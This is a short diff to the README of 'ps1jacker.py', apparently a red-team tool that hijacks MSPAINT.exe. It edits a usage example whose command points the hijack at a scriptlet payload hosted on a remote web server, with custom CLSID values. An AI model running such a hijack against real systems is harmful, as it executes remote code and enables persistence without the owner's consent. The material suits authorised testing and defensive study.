@@ -12,6 +12,6 @@ This will generate a default payload that will open Calculator instead of MSPAIN
 ### TEST 2:
 Hijacking MSPAINT.exe by specifing custom parameters.
 
-`python ./ps1jacker.py -p "http://<web_server_ip>/calc.sct" -ch {926749FA-2615-4987-8845-C33E65F2B957} -cf {00000001-0001-0001-0001-0000DEADBEEF}`
+`python ./ps1jacker.py -p "http://<web_server_ip>/<your_sct_file>" -ch {926749FA-2615-4987-8845-C33E65F2B957} -cf {00000001-0001-0001-0001-0000DEADBEEF}`
 
 
